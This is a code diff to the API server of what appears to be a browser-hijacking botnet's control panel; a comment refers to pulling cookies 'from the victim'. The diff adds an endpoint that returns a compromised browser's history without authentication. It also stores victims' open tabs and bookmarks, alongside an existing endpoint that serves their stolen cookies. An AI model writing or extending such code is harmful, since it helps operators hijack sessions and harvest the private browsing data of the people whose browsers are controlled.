@@ -94,6 +94,7 @@ async function get_api_server(proxy_utils) {
             `${API_BASE_PATH}/login`,
             `${API_BASE_PATH}/verify-proxy-credentials`,
             `${API_BASE_PATH}/get-bot-browser-cookies`,
+            `${API_BASE_PATH}/get-bot-browser-history`,
         ];
         if (ENDPOINTS_NOT_REQUIRING_AUTH.includes(req.originalUrl)) {
             next();
@@ -204,6 +205,9 @@ async function get_api_server(proxy_utils) {
                 'user_agent',
                 'updatedAt',
                 'createdAt',
+                'current_tab',
+                'tabs',
+                'bookmarks',
             ]
         });
 
@@ -407,7 +411,7 @@ async function get_api_server(proxy_utils) {
     /*
         Pull down the cookies from the victim
     */
-    const GetBotBrowserCookiesSchema = {
+    const GetBotBrowserDataSchema = {
         type: 'object',
         properties: {
             username: {
@@ -420,7 +424,7 @@ async function get_api_server(proxy_utils) {
             },
         }
     }
-    app.post(API_BASE_PATH + '/get-bot-browser-cookies', validate({ body: GetBotBrowserCookiesSchema }), async (req, res) => {
+    app.post(API_BASE_PATH + '/get-bot-browser-cookies', validate({ body: GetBotBrowserDataSchema }), async (req, res) => {
         const bot_data = await Bots.findOne({
             where: {
                 proxy_username: req.body.username,
@@ -445,6 +449,35 @@ async function get_api_server(proxy_utils) {
             "success": true,
             "result": {
                 "cookies": browser_cookies
+            }
+        }).end();
+    });
+
+    app.post(API_BASE_PATH + '/get-bot-browser-history', validate({ body: GetBotBrowserDataSchema }), async (req, res) => {
+        const bot_data = await Bots.findOne({
+            where: {
+                proxy_username: req.body.username,
+                proxy_password: req.body.password,
+            }
+        });
+
+        if (!bot_data) {
+            res.status(200).json({
+                "success": false,
+                "error": "User not found with those credentials, please try again.",
+                "code": "INVALID_CREDENTIALS"
+            }).end();
+            return
+        }
+
+        const browser_history = await proxy_utils.get_browser_history_array(
+            bot_data.browser_id
+        );
+
+        res.status(200).json({
+            "success": true,
+            "result": {
+                "cookies": browser_history
             }
         }).end();
     });
